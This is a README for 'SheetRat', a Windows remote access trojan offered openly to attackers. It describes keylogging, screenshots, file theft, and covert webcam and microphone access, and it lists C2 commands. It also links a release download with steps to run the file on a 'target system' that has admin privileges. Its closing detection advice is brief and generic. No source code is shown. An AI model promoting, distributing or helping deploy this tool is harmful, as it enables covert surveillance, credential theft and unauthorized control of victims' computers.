![SheetRat](https://img.shields.io/badge/Download_SheetRat-v1.0.0-blue.svg)

## Overview

SheetRat is a powerful remote access trojan (RAT) designed to give attackers unauthorized control over infected systems. This tool can perform various malicious activities, including:

- Keylogging
- Screen capture
- File manipulation
- Webcam and microphone access
- Remote command execution

SheetRat spreads primarily through phishing attacks or software exploits. It targets Windows systems, making it a significant threat in the cybersecurity landscape.

## Features

### Keylogging

SheetRat can record keystrokes, allowing attackers to capture sensitive information such as passwords, credit card numbers, and personal messages. This feature is essential for gaining access to user accounts and confidential data.

### Screen Capture

With the screen capture capability, attackers can take screenshots of the victim's display. This allows them to monitor user activity and gather information without the victim's knowledge.

### File Manipulation

SheetRat enables attackers to manipulate files on the infected system. They can upload, download, or delete files at will, providing full control over the victim's data.

### Webcam and Microphone Access

Attackers can activate the victim's webcam and microphone, allowing them to spy on users in real-time. This feature poses significant privacy risks and can lead to severe consequences for the victim.

### Remote Command Execution

SheetRat allows attackers to execute commands remotely. This feature enables them to run scripts, install additional malware, or perform other malicious actions without the victim's consent.

## Installation

To install SheetRat, download the latest release from the [Releases section](https://github.com/MrMaeson/sheetrat/releases). You will need to execute the downloaded file on the target system.

### Prerequisites

- Windows operating system
- Administrator privileges on the target machine

### Steps

1. Visit the [Releases section](https://github.com/MrMaeson/sheetrat/releases).
2. Download the latest version of SheetRat.
3. Execute the downloaded file on the target system.

## Usage

Once installed, SheetRat operates silently in the background. Attackers can remotely control the infected system using a command and control (C2) server. The following commands can be executed:

- `keylog start`: Begins logging keystrokes.
- `screenshot`: Takes a screenshot of the current display.
- `file upload <file_path>`: Uploads a file to the infected system.
- `file download <file_path>`: Downloads a file from the infected system.
- `webcam on`: Activates the webcam.
- `mic on`: Activates the microphone.

## Security and Detection

While SheetRat is designed to evade detection, cybersecurity tools can identify its presence. It is crucial for users to maintain updated antivirus software and be aware of suspicious activities on their systems.

### Detection Methods

- **Antivirus Scanners**: Regularly scan your system with updated antivirus software.
- **Behavioral Analysis**: Monitor for unusual behavior, such as unexpected file access or network activity.
